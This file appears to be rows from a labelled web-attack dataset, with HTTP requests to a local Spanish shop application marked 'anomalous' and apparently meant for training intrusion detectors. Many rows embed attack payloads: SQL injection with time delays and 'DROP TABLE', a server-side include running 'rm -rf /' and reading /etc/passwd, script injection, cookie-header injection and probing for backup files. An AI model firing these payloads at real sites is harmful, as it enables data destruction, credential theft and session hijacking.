GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly&dni=01105274D&direccionA=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=norio8&password=4l7ct4ot7pi5a&nombre=Jaen&apellidos=Alicante+Oruna&email=cumby%40blogsmegumi.ly&dni=01105274D&direccionA=Calle+German+Monzon+Gamon%2C+46+&ciudad=Puente+la+Reina+de+Jaca&cp=08278&provincia=Ciudad+Real&ntc=3246974816793870&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/asf-logo-wide.bak,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.INC,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/samples/htmlsamp/styles2.htm,,anomalous
GET,http://localhost:8080/tienda1/.bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes.Old,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.OLD,,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Do%F1a+Sancha+16%2C+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Do%F1a+Sancha+16%2C+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Enpar%2Bantza+Jose+M%2Baria+Makua+129+9B&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Enpar%2Bantza+Jose+M%2Baria+Makua+129+9B&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Do%F1a+Sancha+16%2C+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1A=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Do%F1a+Sancha+16%2C+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1A=Registrar,anomalous
GET,http://localhost:8080/tienda1/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/miembros/.BAK,,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp.java,,anomalous
GET,http://localhost:8080/tienda1/imagenes/3.gif.Bak,,anomalous
GET,http://localhost:8080/tienda1/imagenes/cmenbul.gif/asf-logo-wide.gif/.old,,anomalous
GET,http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080.Old,,anomalous
GET,http://localhost:8080/tienda1/index.jsp.inc,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=20&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=20&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidadA=20&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=39&cantidadA=20&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%7C&login=kimbra&pwd=7g1j1T8RA&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar%7C&login=kimbra&pwd=7g1j1T8RA&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kimbra&pwd=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kimbra&pwd=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kimbra&pwd=3%27sp%2FI%27ADo&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kimbra&pwd=3%27sp%2FI%27ADo&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kimbra&pwdA=7g1j1T8RA&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=kimbra&pwdA=7g1j1T8RA&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
PUT,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8977%27INJECTED_PARAM&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8977%27INJECTED_PARAM&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27INJECTED_PARAM&precio=8977&B1=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%27INJECTED_PARAM&precio=8977&B1=Pasar+por+caja,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8977&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8977&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8977&B1A=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8977&B1A=Pasar+por+caja,anomalous
GET,http://localhost:8080/asf-logo-wide.gif.old,,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=micgael5&password=IMperI%27AL%2Ci%2FsMO&nombre=Nanda&apellidos=Bar%F3+Brathwaite&email=stacquet6%40apicultor.so&dni=71628074W&direccion=C%2F+Poeta+Joan+Valls+69+7%3FB&ciudad=Venturada&cp=06226&provincia=Tarragona&ntc=9868474737420464&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=micgael5&password=IMperI%27AL%2Ci%2FsMO&nombre=Nanda&apellidos=Bar%F3+Brathwaite&email=stacquet6%40apicultor.so&dni=71628074W&direccion=C%2F+Poeta+Joan+Valls+69+7%3FB&ciudad=Venturada&cp=06226&provincia=Tarragona&ntc=9868474737420464&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=micgael5&password=c09ama1o19&nombre=Nanda&apellidos=Bar%F3+Brathwaite&email=stacquet6%40apicultor.so&dniA=71628074W&direccion=C%2F+Poeta+Joan+Valls+69+7%3FB&ciudad=Venturada&cp=06226&provincia=Tarragona&ntc=9868474737420464&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=micgael5&password=c09ama1o19&nombre=Nanda&apellidos=Bar%F3+Brathwaite&email=stacquet6%40apicultor.so&dniA=71628074W&direccion=C%2F+Poeta+Joan+Valls+69+7%3FB&ciudad=Venturada&cp=06226&provincia=Tarragona&ntc=9868474737420464&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,anomalous
GET,http://localhost:8080/servlet/SimpleServlet,,anomalous
GET,http://localhost:8080/tienda1/global/estilos.css.Bak,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/asf-logo-wide.gif~,,anomalous
GET,http://localhost:8080/,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jovo&password=28l3ra8a&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=10191&provincia=Burgos&ntc=3393638948319901&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=28l3ra8a&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=10191&provincia=Burgos&ntc=3393638948319901&B1=Registrar%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jovo&password=28l3ra8a&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=10191&provincia=Burgos&ntc=3393638948319901&B1=Registrar%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=28l3ra8a&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Burgos&ntc=3393638948319901&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jovo&password=28l3ra8a&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Burgos&ntc=3393638948319901&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jovo&password=%2F%27T%E9TrIco&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=10191&provincia=Burgos&ntc=3393638948319901&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=jovo&password=%2F%27T%E9TrIco&nombre=Hebelen&apellidos=Fornalino+Grimaldi&email=ozaki_wanamaker%40travelzone.tel&dni=75981771Y&direccion=Calle+San+Juan+Bautista+De+La+Salle+193+6%3FC&ciudad=Calatorao&cp=10191&provincia=Burgos&ntc=3393638948319901&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.inc,,anomalous
GET,http://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide.Bak,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=73&B1=%253F,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=73&B1=%253F,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=73&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,idA=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=73&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1.Old,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide.gif.Bak,,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=orel&pwd=%F112%F1a&remember=on&B1=Entrar%7C,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=orel&pwd=%F112%F1a&remember=on&B1=Entrar%7C,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=%F112%F1a&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=%F112%F1a&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=orel&pwd=gu%2F%27In_ChADO&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=orel&pwd=gu%2F%27In_ChADO&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=orel&pwd=%F112%F1a&remember=on&B1=Entrar,,anomalous
POST,http://localhost:8080/tienda1/publico/autenticar.jsp,modoA=entrar&login=orel&pwd=%F112%F1a&remember=on&B1=Entrar,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%252B,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%252B,anomalous
GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1,,anomalous
POST,http://localhost:8080/tienda1/publico/caracteristicas.jsp,idA=1,anomalous
GET,http://localhost:8080/tienda1/publico/carrito.jsp/,,anomalous
GET,http://localhost:8080/vti_txt/,,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2520,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%2520,anomalous
GET,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,,anomalous
POST,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsgA=Credenciales+incorrectas,anomalous
GET,http://localhost:8080/tienda1/publico/6909030637832563290.jsp.BAK,,anomalous
GET,http://localhost:8080/tienda1/publico/miembros.jsp/asf-logo-wide.gif/,,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1227&B1=Pasar+por+caja%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1227&B1=Pasar+por+caja%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1227&B1=Confirmar%2F,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1227&B1=Confirmar%2F,anomalous
GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1227&B1A=Pasar+por+caja,,anomalous
POST,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=1227&B1A=Pasar+por+caja,anomalous
GET,http://localhost:8080.Inc,,anomalous
PUT,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=laster&password=dEGENeRACi%F3n&nombre=Vinka&apellidos=Gari+Vilanova&email=dolitzkaya_sali%40coreserv.ar&dni=54849624Y&direccion=Mare+De+Deu+De+La+Fuencisla+144%2C+7G&ciudad=Coma+i+la+Pedra%2C+La&cp=22951&provincia=C%F3rdoba&ntc=8199901280285368&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=crow%2C%2Cd%2Ber&password=dEGENeRACi%F3n&nombre=Vinka&apellidos=Gari+Vilanova&email=dolitzkaya_sali%40coreserv.ar&dni=54849624Y&direccion=Mare+De+Deu+De+La+Fuencisla+144%2C+7G&ciudad=Coma+i+la+Pedra%2C+La&cp=22951&provincia=C%F3rdoba&ntc=8199901280285368&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=crow%2C%2Cd%2Ber&password=dEGENeRACi%F3n&nombre=Vinka&apellidos=Gari+Vilanova&email=dolitzkaya_sali%40coreserv.ar&dni=54849624Y&direccion=Mare+De+Deu+De+La+Fuencisla+144%2C+7G&ciudad=Coma+i+la+Pedra%2C+La&cp=22951&provincia=C%F3rdoba&ntc=8199901280285368&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=laster&password=dEGENeRACi%F3n&nombre=Vinka&apellidos=Gari+Vilanova&email=dolitzkaya_sali%40coreserv.ar&dni=54849624Y&direccion=Mare+De+Deu+De+La+Fuencisla+144%2C+7G&ciudad=Coma+i+la+Pedra%2C+La&cp=22951&provincia=C%F3rdoba&ntc=8199901280285368&B1A=Registrar,,anomalous
POST,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=laster&password=dEGENeRACi%F3n&nombre=Vinka&apellidos=Gari+Vilanova&email=dolitzkaya_sali%40coreserv.ar&dni=54849624Y&direccion=Mare+De+Deu+De+La+Fuencisla+144%2C+7G&ciudad=Coma+i+la+Pedra%2C+La&cp=22951&provincia=C%F3rdoba&ntc=8199901280285368&B1A=Registrar,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2500,,anomalous
POST,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%2500,anomalous
GET,http://localhost:8080/tienda1/publico/,,anomalous
GET,http://localhost:8080/tienda1/publico/vaciar.jsp/asf-logo-wide.gif.java,,anomalous
GET,http://localhost:8080/tienda1/asf-logo-wide.gif,,anomalous
GET,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.Old,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/miembros/index.jsp.OLD,,anomalous
GET,http://localhost:8080/estore/populate,,anomalous
PUT,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ming-min&password=recambiar&nombre=Biblis&apellidos=Gascan+Vilar%F3&email=forte_cortesa%40delujos.ba&dni=05041400F&direccion=Ramon+Bonifaz%2C+6+6%3FH&ciudad=Bergondo&cp=03189&provincia=M%E1laga&ntc=7946193683078686&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ming-min&password=recambiar&nombre=Biblis&apellidos=Gascan+Vilar%F3&email=forte_cortesa%40delujos.ba&dni=05041400F&direccion=Ramon+Bonifaz%2C+6+6%3FH&ciudad=Bergondo&cp=0361A&provincia=M%E1laga&ntc=7946193683078686&B1=Registrar,,anomalous
POST,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=ming-min&password=recambiar&nombre=Biblis&apellidos=Gascan+Vilar%F3&email=forte_cortesa%40delujos.ba&dni=05041400F&direccion=Ramon+Bonifaz%2C+6+6%3FH&ciudad=Bergondo&cp=0361A&provincia=M%E1laga&ntc=7946193683078686&B1=Registrar,anomalous
GET,http://localhost:8080/tienda1/miembros/fotos.jsp/asf-logo-wide.gif/.inc,,anomalous
GET,http://localhost:8080/6909030637832563290.jsp,,anomalous
GET,http://localhost:8080/tienda1/imagenes/1.gif.Bak,,anomalous
GET,http://localhost:8080/vti_txt/,,anomalous
GET,http://localhost:8080/tienda1.Old,,anomalous
GET,http://localhost:8080/servlet/snoop2,,anomalous
GET,http://localhost:8080/samples/dbsamp/dbsamp2.htm,,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=28&B1=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=28&B1=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=28&B1A=A%F1adir+al+carrito,,anomalous
POST,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=85&cantidad=28&B1A=A%F1adir+al+carrito,anomalous
GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=trevor&pwd=In67488&remember=off%2F&B1=Entrar,,anomalous
